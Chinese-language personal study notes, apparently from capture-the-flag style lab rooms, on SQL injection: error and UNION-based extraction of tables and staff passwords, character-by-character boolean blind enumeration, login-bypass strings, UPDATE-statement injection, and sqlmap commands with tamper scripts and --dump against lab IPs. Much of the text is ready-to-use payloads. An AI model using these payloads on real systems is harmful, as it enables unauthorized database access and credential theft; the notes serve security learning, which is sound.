sql注入 由dbms控制 数据库管理系统的缩写 DBMS 分为两大类：关系型和非关系型数据库

# 大致步骤
## 注入检测

可以通过多种方式检测注入。其中最简单的方法是在各种参数后添加'或"从而得到一个从Web服务器返回的数据库报错信息。

### 参数
#### 1. GET - HTTP Request

例如：网址参数（下面的请求的`id`），Cookie，host以及任何自定义headers信息。然而，HTTP请求中的任何内容都可能容易受到SQL注入的攻击。

#### 2. POST - Form Data
在具有Content-Type为application/x-www-form-urlencoded的标准HTTP POST请求中，注入将类似于GET请求中的URL参数。它们位于HTTP头信息下方，但仍可以用相同的方式进行利用。
#### 3.POST - JSON
在具有Content-Type为application/json的标准HTTP POST请求中，注入通常是JSON{"key":"value"}对的值。该值也可以是数组或对象。

#### 4. POST - XML
在具有Content-Type为application/xml的标准HTTP POST请求中，注入通常在一个内部。

## 简单步骤
 尝试在 id=1 后输入撇号 (  **' )，然后按回车键。您将看到这将返回一个**SQL错误，通知您语法错误。您收到此错误消息这一事实证实了存在SQL注入漏洞。我们现在可以利用此漏洞并使用错误消息来了解有关数据库结构的更多信息。 


我们需要做的第一件事是将数据返回给浏览器而不显示错误消息。首先，我们将尝试 UNION 运算符，这样如果我们选择它，我们就可以收到额外的结果。尝试将模拟浏览器 id 参数设置为：

```
1 UNION SELECT 1
```


  
此语句应生成一条错误消息，通知您 UNION SELECT 语句的列数与原始 SELECT 查询不同。因此，让我们再试一次，但添加另一列：

```
1 UNION SELECT 1,2
```

  

再次出现相同的错误，因此让我们通过添加另一列来重复此错误：

```
1 UNION SELECT 1,2,3
```

  

成功，错误消息消失，文章正在显示，但现在我们想显示我们的数据而不是文章。显示文章是因为它获取了网站代码中某个位置的第一个返回结果并显示该结果。为了解决这个问题，我们需要第一个查询不产生任何结果。只需将文章 ID 从 1 更改为 0 即可完成此操作。

```
0 UNION SELECT 1,2,3
```

  

现在您将看到该文章仅由 UNION 选择的结果组成，返回列值 1、2 和 3。我们可以开始使用这些返回的值来检索更多有用的信息。首先，我们将获取我们可以访问的数据库名称：

```
0 UNION SELECT 1,2,database()
```

  

现在您将看到之前显示数字 3 的位置；它现在显示数据库的名称，即 **sqli_one**。

  

我们的下一个查询将收集该数据库中的表的列表。

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

  

在这个查询中，有几个新东西需要学习。首先，  **group_concat()**方法 从多个返回的行中获取指定的列（在我们的例子中是 table_name），并将其放入一个用逗号分隔的字符串中。接下来是 **information_schema** 数据库；数据库的每个用户都可以访问它，它包含有关用户可以访问的所有数据库和表的信息。在这个特定的查询中，我们感兴趣的是列出 **sqli_one** 数据库中的所有表，即 article 和 staff_users。 

  
由于第一级的目的是发现 Martin 的密码，因此我们感兴趣的是 staff_users 表。我们可以再次利用 information_schema 数据库，使用以下查询来查找该表的结构。

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
 

这与上一个 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 **column_name**，我们在 information_schema 数据库中查询的表已从 tables 更改为 **columns**，并且我们正在搜索 **table_name** 列具有值 **staff_users**的任何行。

  
查询结果为 staff_users 表提供了三列：id、password 和 username。我们可以使用 username 和 password 列进行以下查询以检索用户的信息。

```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR ' FROM staff_users
```

## 布尔盲注

在SQL注入示例机的第三级，您将看到一个带有以下 URL 的模拟浏览器：

**https://website.thm/checkuser ?用户名=admin**

  
浏览器主体包含  **{"taken":true}**。此API端点复制了许多注册表单上的常见功能，即检查用户名是否已注册，以提示用户选择其他用户名。由于 **taken** 值设置为 **true**，我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 **admin**更改 为 **admin123来确认这一点，按下回车键后，您会看到****taken**值  现已更改为 **false**。

  

处理的SQL查询如下所示：

  
`select * from users where username = '%username%' LIMIT 1;`

  

我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行SQL注入。将用户名保留为 **admin123**，我们可以开始向其添加内容，以尝试让数据库确认真实情况，将所采取字段的状态从 false 更改为 true。

与之前的级别一样，我们的第一个任务是确定用户表中的列数，我们可以通过使用 UNION 语句来实现。将用户名值更改为以下内容：

  
`admin123' UNION SELECT 1;--` 

  

由于 Web 应用程序已将所取值 **作为** false 进行响应，因此我们可以确认这是列的错误值。继续添加更多列，直到我们得到 **true****的** 值 。您可以通过将用户名设置为以下值来确认答案是三列：

  
`admin123' UNION SELECT 1,2,3;--` 

  

既然已经确定了列数，我们就可以开始枚举数据库了。我们的首要任务是发现数据库名称。我们可以通过使用内置的 **database()** 方法，然后使用 **like** 运算符来尝试找到返回 true 状态的结果。

尝试以下用户名值并观察会发生什么：


`admin123' UNION SELECT 1,2,3 where database() like '%';--`

  

**我们得到一个 true 响应，因为在 like 运算符中，我们只有%**的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%**，您会看到响应返回 false，这确认数据库名称不是以字母 **a**开头。我们可以循环遍历所有字母、数字和字符（例如 - 和 _ ），直到发现匹配项。如果您发送以下内容作为用户名值，您将收到一个 **true** 响应，确认数据库名称以字母 **s**开头。

`admin123' UNION SELECT 1,2,3 where database() like 's%';--`

  

现在，您继续 查找数据库名称的下一个字符，直到找到另一个真实响应，例如“sa％”，“sb％”，“sc％”等。继续此过程，直到发现数据库名称的所有字符，即 **sqli_three**。

我们已经确定了数据库名称，现在我们可以利用 information_schema 数据库以类似的方法枚举表名。尝试将用户名设置为以下值：

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`

  

**此查询在information_schema** 数据库中的 **表表**中查找  数据库名称与 **sqli_three**匹配且表名称以字母 a 开头的结果。由于上述查询导致 **错误** 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。与之前一样，您需要循环使用字母、数字和字符，直到找到匹配项。

您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下用户名负载来确认：

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`

  

最后，我们现在需要枚举 **用户** 表中的列名，以便我们可以正确地在其中搜索登录凭据。同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询列名。使用下面的有效负载，我们搜索列表， **其中** 数据库等于 sqli_three，表名为 users，列名以字母 a 开头。

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`

  

同样，您需要循环输入字母、数字和字符，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名时，您都必须将其添加到您的有效负载中，以避免发现相同的列名。例如，一旦您找到名为 **id**的列，您就会将其附加到您的原始有效负载中（如下所示）。

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`

  

重复此过程三次，您将发现列的 ID、用户名和密码。现在您可以使用它们来查询 **用户** 表以获取登录凭据。首先，您需要发现一个有效的用户名，您可以使用下面的有效负载：

`admin123' UNION SELECT 1,2,3 from users where username like 'a%`

  

循环遍历所有字符后，您将确认用户名 **admin**的存在。现在您已经获得了用户名。您可以专心寻找密码。下面的有效载荷向您展示了如何找到密码：

`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`

循环查看所有字符，你会发现密码是 3845。

##  SQL 注入 1：输入框非字符串
```
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
```

```
1 or 1=1-- -
```

绕过登录


## SQL 注入 2:输入框字符串
字符型绕过
```
1' or '1'='1'-- -
```

## SQL 对 UPDATE 语句的注入攻击

可以尝试将类似于以下代码的内容注入到 nickName 和 email 字段中：

```
asd',nickName='test',email='hacked
```

将恶意负载注入 nickName 字段时，仅更新 nickName。当注入到 email 字段中时，两个字段都会更新：


确定注入点之后  判断数据库版本号

```
# MySQL and MSSQL
',nickName=@@version,email='

# For Oracle
',nickName=(SELECT banner FROM v$version),email='

# For SQLite
',nickName=sqlite_version(),email='
```

暴库

```
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

暴字段

```
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```



## 身份验证

```
' union select 1,2
' UNION SELECT 1, password from users-- -
' UNION SELECT 1,group_concat(password) FROM users-- -
```

## 盲注 

这里推荐是 sqlmap 

```
sqlmap -u http://10.10.76.250:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
```
[[linux工具#sqlmap]]


## sql inject lab 小笔记
[[linux工具#sqlmap]]
```
sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 
--second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast

# --tamper so-tamper.py - The tamper script
# --url - The URL of the injection point, which is /signup in this case
# --data - The POST data from the registraion form to /signup. 
#   Password must be the same as the password in the tamper script
# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
# -p username - The parameter to inject to
# --dbms sqlite - To speed things up
# --technique=U - The technique to use. [U]nion-based
# --no-cast - Turn off payload casting mechanism
```

## book test
思路

其实前面都是瞎折腾

```
') or 1=1-- -
```

有一个提示 这个可以爆出所有书名

```
') union select 1,2,3,4-- -
```
可以看出注入点
